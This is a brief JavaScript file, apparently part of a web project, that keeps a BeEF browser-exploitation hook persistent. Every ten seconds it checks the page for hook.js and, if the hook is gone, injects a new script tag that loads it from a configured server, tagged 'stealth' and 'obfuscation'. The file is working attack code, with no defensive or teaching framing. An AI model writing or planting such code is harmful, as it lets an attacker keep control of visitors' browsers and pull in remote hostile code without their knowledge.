// public/beef-persistence.js
// This file contains logic for maintaining BeEF hook persistence.

function checkAndReloadBeEFHook() {
    // Check if the BeEF hook script is present in the DOM
    const beefScript = document.querySelector('script[src*="hook.js"]');

    if (!beefScript) {
        console.log('BeEF hook not found. Attempting to re-inject.');
        const newBeefHook = document.createElement('script');
        // This URL needs to be dynamically generated or configured based on your BeEF setup
        // For now, using a placeholder. In a real scenario, this would come from your backend.
        newBeefHook.src = 'http://localhost:3000/hook.js'; 
        newBeefHook.setAttribute('data-stealth', 'true');
        newBeefHook.setAttribute('data-obfuscation', 'advanced');
        document.head.appendChild(newBeefHook);
    } else {
        console.log('BeEF hook already present.');
    }
}

// Run the check periodically
setInterval(checkAndReloadBeEFHook, 10000); // Check every 10 seconds

console.log('BeEF Persistence script loaded.');